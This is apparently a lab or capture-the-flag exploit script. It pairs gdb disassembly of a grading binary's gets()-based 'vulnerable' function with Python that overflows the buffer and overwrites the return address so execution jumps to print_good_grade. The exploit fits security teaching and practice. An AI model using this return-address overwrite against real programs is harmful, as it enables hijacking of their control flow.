'''Dump of assembler code for function print_good_grade:
   0x08048c23 <+0>:     push   ebp
   0x08048c24 <+1>:     mov    ebp,esp
   0x08048c26 <+3>:     push   ebx
   0x08048c27 <+4>:     sub    esp,0x4
   0x08048c2a <+7>:     call   0x8048790 <__x86.get_pc_thunk.bx>
   0x08048c2f <+12>:    add    ebx,0x953d1
   0x08048c35 <+18>:    sub    esp,0xc
   0x08048c38 <+21>:    lea    eax,[ebx-0x2ded1]
   0x08048c3e <+27>:    push   eax
   0x08048c3f <+28>:    call   0x80507d0 <puts>
   0x08048c44 <+33>:    add    esp,0x10
   0x08048c47 <+36>:    sub    esp,0xc
   0x08048c4a <+39>:    push   0x1
   0x08048c4c <+41>:    call   0x804f220 <exit>
End of assembler dump.
(gdb) disas print_bad_grade
Dump of assembler code for function print_bad_grade:
   0x08048bf5 <+0>:     push   ebp
   0x08048bf6 <+1>:     mov    ebp,esp
   0x08048bf8 <+3>:     push   ebx
   0x08048bf9 <+4>:     sub    esp,0x4
   0x08048bfc <+7>:     call   0x8048790 <__x86.get_pc_thunk.bx>
   0x08048c01 <+12>:    add    ebx,0x953ff
   0x08048c07 <+18>:    sub    esp,0xc
   0x08048c0a <+21>:    lea    eax,[ebx-0x2dee4]
   0x08048c10 <+27>:    push   eax
   0x08048c11 <+28>:    call   0x80507d0 <puts>
   0x08048c16 <+33>:    add    esp,0x10
   0x08048c19 <+36>:    sub    esp,0xc
   0x08048c1c <+39>:    push   0x0
   0x08048c1e <+41>:    call   0x804f220 <exit>
End of assembler dump.
(gdb) disas vulnerable
Dump of assembler code for function vulnerable:
   0x08048c51 <+0>:     push   ebp
   0x08048c52 <+1>:     mov    ebp,esp
   0x08048c54 <+3>:     push   ebx
   0x08048c55 <+4>:     sub    esp,0x14
   0x08048c58 <+7>:     call   0x8048c9a <__x86.get_pc_thunk.ax>
   0x08048c5d <+12>:    add    eax,0x953a3
   0x08048c62 <+17>:    sub    esp,0xc
   0x08048c65 <+20>:    lea    edx,[ebp-0xc]
   0x08048c68 <+23>:    push   edx
   0x08048c69 <+24>:    mov    ebx,eax
   0x08048c6b <+26>:    call   0x8050640 <gets>
   0x08048c70 <+31>:    add    esp,0x10
   0x08048c73 <+34>:    nop
   0x08048c74 <+35>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x08048c77 <+38>:    leave  
   0x08048c78 <+39>:    ret    
End of assembler dump.


Need to change address to  0x08048c23
'''
import sys
	
addr = 0x8048c27.to_bytes(4, "little")
sys.stdout.buffer.write(b"A" * 16 + addr)
	
